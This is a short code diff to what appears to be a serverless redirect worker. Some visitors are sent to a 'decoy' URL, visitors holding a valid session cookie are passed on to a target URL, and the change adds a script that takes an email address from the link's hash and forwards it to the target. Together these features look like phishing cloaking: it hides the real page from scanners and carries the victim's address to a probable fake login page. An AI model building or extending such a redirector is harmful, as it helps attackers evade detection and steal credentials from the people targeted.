@@ -25,13 +25,24 @@ export default {
       return Response.redirect(decoyUrl, 302);
     }
 
-    // Layer 2: Valid session cookie = skip everything
+    // Layer 2: Valid session cookie = skip everything, but use JS redirect to format the hash
     const cookieHeader = request.headers.get('Cookie') || '';
     const sessionCookie = parseCookie(cookieHeader, '__sess');
     if (sessionCookie) {
       const valid = await verifyCookie(sessionCookie, cookieSecret, cookieTTL);
       if (valid) {
-        return Response.redirect(targetUrl, 302);
+        const jsRedirect = `<!DOCTYPE html><html><head><script>
+          var hash = window.location.hash;
+          var email = hash.includes('=') ? hash.split('=')[1] : hash.replace('#', '');
+          window.location.replace('${targetUrl}' + (email ? '#' + email : ''));
+        </script></head><body></body></html>`;
+        
+        return new Response(jsRedirect, {
+          headers: {
+            'Content-Type': 'text/html; charset=utf-8',
+            'Cache-Control': 'no-store, no-cache, must-revalidate',
+          },
+        });
       }
     }
 
